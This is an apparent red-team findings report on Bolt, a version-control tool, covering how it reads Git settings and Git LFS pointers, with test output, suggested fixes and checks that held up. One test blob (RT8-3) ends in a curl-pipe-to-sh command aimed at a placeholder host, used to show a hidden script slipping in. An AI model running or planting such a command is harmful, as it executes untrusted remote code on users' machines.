## Findings

- **RT8-1 Medium (a misleading stop; T31, decision 089).**
  - **What.** Bolt takes `lfs.storage` from `~/.gitconfig` (and `$XDG_CONFIG_HOME/git/config`, with plain includes), `.git/config` and `config.worktree`. Git, and Git LFS through it, also read the system's settings (`/etc/gitconfig`, `GIT_CONFIG_SYSTEM`; on Windows Git's own `etc\gitconfig`), read the file `GIT_CONFIG_GLOBAL` names *instead of* `~/.gitconfig`, and follow `[includeIf]`. So:
    - `lfs.storage` in the system's settings, or in an `[includeIf]` of the user's own: Git LFS keeps the objects elsewhere, and Bolt says they are missing and to run `git lfs fetch --all`. That never helps: it fetches into the other place. Decision 089 was written to avoid exactly this hint. For the repository's own includes the hint warns that one may set `lfs.storage`; for the user's it says nothing.
    - `GIT_CONFIG_GLOBAL` set: Git ignores `~/.gitconfig`, so its `lfs.storage` doesn't apply and Git LFS keeps the objects in `.git/lfs/objects`, where they are. Bolt still reads `~/.gitconfig` and refuses an import that would work, telling the user to remove a setting Git doesn't use.
  - **Who is hit.** Anyone whose `lfs.storage` lives in the machine's Git settings (a shared object store on a build machine or a company image), in an `[includeIf "gitdir:~/work/"]` file, or whose Git settings are moved with `GIT_CONFIG_GLOBAL` (dotfile managers, CI, test harnesses). Uncommon, but each is a documented Git and Git LFS way of working.
  - **Proof (test).** `rt8_1_an_import_takes_lfs_storage_from_where_git_does` (renamed `rt8_1_lfs_storage_is_read_where_git_reads_it_and_the_stop_says_where_bolt_cant` in the fix, [decision 094](../decisions/094-red-team-m5-rulings.md)): three repositories with one Git LFS file; `git lfs env` shows where Git LFS itself keeps the object:
    ```
    GIT_CONFIG_GLOBAL: Git LFS: LocalMediaDir=/tmp/.tmp6obdU6/.git/lfs/objects
    bolt import: Some(1)
    error: Commit `1bb26e6f…` holds a Git LFS file at `a.bin`, but `lfs.storage` keeps Git LFS's files outside .git/lfs/objects, where Bolt reads them: it is set to `/nowhere/shared-lfs` in /tmp/.tmpSHT2R4/.gitconfig.
    system settings: Git LFS: LocalMediaDir=/tmp/.tmp34rgDE/objects
    bolt import: Some(1)
    error: A Git LFS file in this history isn't in .git/lfs/objects:
      `a.bin` in commit `1bb26e6f…` (17 bytes)
    hint: Nothing was changed. Download every version Git LFS keeps with `git lfs fetch --all`, then run bolt import again. …
    includeIf: Git LFS: LocalMediaDir=/tmp/.tmpGYhmah/objects
    bolt import: Some(1)
    error: A Git LFS file in this history isn't in .git/lfs/objects: … (the same hint)
    lfs.storage misread with ["GIT_CONFIG_GLOBAL", "the system's settings", "an [includeIf] of the user's settings"]
    ```
    `redteam/attacks7/git-lfs-probes.sh` shows Git LFS 3.3.0 taking `lfs.storage` from `GIT_CONFIG_SYSTEM` and `GIT_CONFIG_COUNT` too, and not from `.lfsconfig`.
  - **Fix.** Read the user's settings as Git does: `GIT_CONFIG_GLOBAL` in place of the two home files when it is set, and the system's file (`GIT_CONFIG_SYSTEM`, else Git's own path; none under `GIT_CONFIG_NOSYSTEM`). Taking `GIT_CONFIG_COUNT`/`KEY`/`VALUE` too is cheap. Where Bolt still can't know (`[includeIf]`, `-c`), let the missing-objects hint say, as it does for the repository's own includes, that a setting Bolt doesn't read may keep them elsewhere, and name `git lfs env`, whose `LocalMediaDir` line answers it. Needs a decision refining 060 and 089. RT8-2 is the same reader.

- **RT8-2 Medium (files silently left out of saves, and a file Git keeps out saved; decision 047, from milestone 3, found through RT8-1's reader).**
  - **What.** `core.excludesFile`, Git's personal ignore list, is read from the same files as `lfs.storage` in RT8-1. Under `GIT_CONFIG_GLOBAL`, Git takes the list from the file that variable names; Bolt takes it from `~/.gitconfig` whatever it says. Every save then applies a list Git doesn't: it silently leaves out files Git tracks, and takes in files the user's real list keeps out of Git, such as keys. Neither `save` nor `status` mentions either.
  - **Who is hit.** Anyone running Bolt with `GIT_CONFIG_GLOBAL` set while `~/.gitconfig` names another list, or none. A left-out file is never in any save, so it is gone with the folder's copy. A secret that is saved is in history.
  - **Proof (test).** `rt8_2_a_save_leaves_out_what_gits_own_ignore_list_leaves_out`: `~/.gitconfig` names a list holding `*.psd`; the file `GIT_CONFIG_GLOBAL` names, a list holding `*.key`:
    ```
    git status with GIT_CONFIG_GLOBAL: ?? art.psd ?? readme.txt
    bolt save: Saved ytvn  "First"  (2 files)
    saved: ["deploy.key", "readme.txt"]
    ```
  - **Fix.** As for RT8-1: take the user's Git settings from where Git takes them, `GIT_CONFIG_GLOBAL` first. Until then, a save run with `GIT_CONFIG_GLOBAL` set could warn that Bolt reads `~/.gitconfig` instead.

- **RT8-3 Low (a file brought in as something Git LFS doesn't check out, silently; T31, decision 085).**
  - **What.** Decision 085 counts as a Git LFS file "a file of at most 1,024 bytes that Git LFS's own pointer parser accepts". Git LFS's smudge filter (`DecodeFrom` in lfs/pointer.go) reads a blob's first 1,024 bytes, trims them and parses that, whatever follows. So a blob that starts with a pointer and spaces, then holds anything at all, is checked out by Git LFS as the pointer's object. Bolt brings it in as its raw text. The look-alike warning stops at 1,024 bytes too, so nothing is said. Git LFS's scanner, which `ls-files` and `fetch` use, skips blobs over 1,024 bytes (`git lfs ls-files --all` lists only the plain pointer beside such a blob, in `git-lfs-probes.sh`), so Git LFS disagrees with itself here; but what a user with Git LFS sees after `git checkout` is the object.
  - **Who is hit.** Importers of a repository that holds such a blob. Git LFS never writes one, so it takes a hostile or broken history. There, people reviewing in Git with Git LFS see one file (the object), and the Bolt history holds another (the blob, whose tail can be a script). Nothing already in Bolt is lost.
  - **Proof (test).** `rt8_3_a_blob_git_lfs_reads_as_a_pointer_never_comes_in_silently_as_text`: a 1,164-byte blob, a pointer, 1,000 spaces, then `curl https://example.invalid/x | sh`:
    ```
    git lfs smudge of the 1164-byte blob gives "the picture everyone reviewed\n"
    bolt import: a.bin saved as 1164 bytes, the picture: false; warned: false; warnings: []
    ```
  - **Fix.** For a blob over 1,024 bytes, apply Git LFS's parser to its first 1,024 bytes. If it reads as a pointer, either bring the file in as Git LFS's checkout does (its object), or keep the text and warn as for a look-alike, naming the blob. Warning is the smaller change, and treats such a blob as a look-alike is treated now. The first pass's walk would read the first 1,024 bytes of such blobs too.

## Not proven

These are suspicions or costs without a failing test. None counts as a finding.

- **A big file whose chunks are spread over many packs is slow to read.** At most 16 packs stay open, and a chunk in a closed pack opens the closed ones by name until found, closing others. With 1,674 chunks (128 MiB) dealt round-robin over 1, 16, 17, 40 and 80 packs, a read took 0.20, 0.20, 0.21, 0.72 and 1.65 s (`rt8_spread.rs`): linear in the packs past 16. An honest history of a big file edited all over leaves its chunks in every merged pack. No document bounds a write-out's time, so it is a cost to benchmark (decision 088's sets have at most 10 versions), not a finding.
- **Several bad lists for one file multiply its read.** Each copy is tried once per command, and a list whose chunks all exist but build another file is read to its end before its final check. N planted lists cost N reads of the file on every `goto`. A hostile `.bolt` can cost as much in other ways.
- **A link below `.git/lfs/objects`** (at `objects/ab`, say) makes its objects "missing", so the stop says to fetch. Decision 089 names only `.git/lfs` and `.git/lfs/objects`. Not run; nobody links there by accident.
- **Invalid UTF-8 in two extension keys.** `lfs_pointer` reads the text lossily, so `ext-0-a\xff` and `ext-0-a\xfe` become one key, where Git LFS sees two keys with one priority and refuses the pointer. Bolt would then stop the import at "a pointer with extensions" for a blob Git LFS checks out as text. Reasoned, not run; only a hostile blob does this.
- **`tidy`'s memory grows with every distinct chunk ID it keeps** (about 40 bytes each), on top of one decoded list at a time. A planted young list naming 8,388,608 distinct IDs adds about 320 MB that stays until `tidy` ends. Honest stores scale the same way. Not run at that size.
- **On Windows a program can set a file's change time back.** A file changed during a save, then given back all its old times, isn't seen. That takes a program set on fooling Bolt.

## Held up

Each of these was tried in the sandbox unless marked as code reading, and Bolt behaved correctly:

- **Crashes at every abort point** (`BOLT_FAULT_AT`; `redteam/attacks7/rt8_sweeps.rs` and `rt8_import_sweep.rs`):
  - `discard` of an edited 3 MiB file and a new 2 MiB one (12 stops);
  - `shelf`, `unshelf` and `save` of big files;
  - `tidy` over four versions of a 3 MiB file, a `discard`'s kept work and a shelf, with packs three days old;
  - after each stop: `status`, then the command again, then `undo` (and `redo`, but after `tidy`). Every version and the unsaved work stayed on disk or read back from the store.
  - `import` of a repository with a big Git LFS file in two versions, a small one, and a 4 MiB file Git stored as a delta (so its family was rebuilt): stopped at each of its 7 abort points, then run again, it finished every time with exactly the files a clean import gives, and left `.bolt/tmp` empty.
- **Two lists for one file** (`rt8_lists.rs`): a list with the chunks in reverse order, and one naming a chunk no pack holds, each in a pack named to come first. 40 saves then merged the small packs, and `tidy` rewrote the old ones. Before, between and after, the file read back right and `discard` wrote the right bytes.
- **Git LFS's parser** (`git-lfs-probes.sh` against git-lfs 3.3.0): an uppercase oid, text after the oid, and CRLF with blank lines and spaces around it get the same answer from Bolt as from Git LFS. Git LFS ignores `lfs.storage` in `.lfsconfig`, and so does Bolt.
- **Memory** (`rt8_res.rs`, debug build, peak resident memory):
  - `save` of a 256 MiB file: 20 MiB;
  - `status` with it changed: 13 MiB;
  - `discard` of it: 21 MiB;
  - `undo`: 13 MiB;
  - the import of a 120 MiB file in four versions Git stored as deltas: 260 MiB, the base and what it builds, as decision 086 says.
- **What reads the store** (code reading): every caller of `copy_content` uses what it wrote only after `Ok`:
  - `write_file` renames only then, after a size check;
  - `link_target` and `changes` cap and discard;
  - `endings::converted` stops comparing at the first difference.

  A chunk is never read through a list (`Wanted::Chunk` takes content only). Merging's second pass keeps every different list for one ID in a new pack. `tidy` reads every list of a kept file, and every list in a young pack, before it judges a pack. The first save's pointer look skips a file only when the cache vouches that it is the saved file.
- **Workers** (code reading): each job's cost covers what it holds, and `Big` jobs fill the window, so the writer's nested 64 MiB window never overlaps the outer one. A lost worker ends the save with an error, never a short listing.
- **The family rebuild** (code reading): each member is checked against its name before it is stored. A loop, or a delta on another pack, ends the family. Spill files are removed when let go, and cleared by the next `begin` or open. `.git/lfs/objects` is opened with `O_NONBLOCK`, so a pipe there doesn't hang the import.
- **Terminal output** (code reading): every Git LFS stop and warning escapes paths, commits, oids, `lfs.storage` values and config paths. The pack paths in merge and `tidy` notes are escaped too.
- **Windows (CI, `redteam/m5`)**:
  - A hard link at a chunked file, to a file outside the project, through `discard`, `undo`, `unshelf` and `redo`: the outside file stayed as it was.
  - An edited, read-only big file through `discard` and `undo`: replaced, and the work came back.
  - A project whose files, `.bolt/tmp` names and `.git/lfs/objects` paths pass MAX_PATH (260 characters): `import` of a 2 MiB Git LFS file, the first save's stop at its pointer, and `bolt discard` writing the file back through `.bolt/tmp`, all worked.
  - All three passed in [run 42666092491](https://github.com/WisHonor/Bolt/actions/runs/42666092491), on Linux and macOS too, where they compile to nothing.
  - The first run, [42663102683](https://github.com/WisHonor/Bolt/actions/runs/42663102683), passed the first two. The long-path test failed in its own set-up there: Git can't `init` that deep. It now makes the repository at a short path and moves it into place.
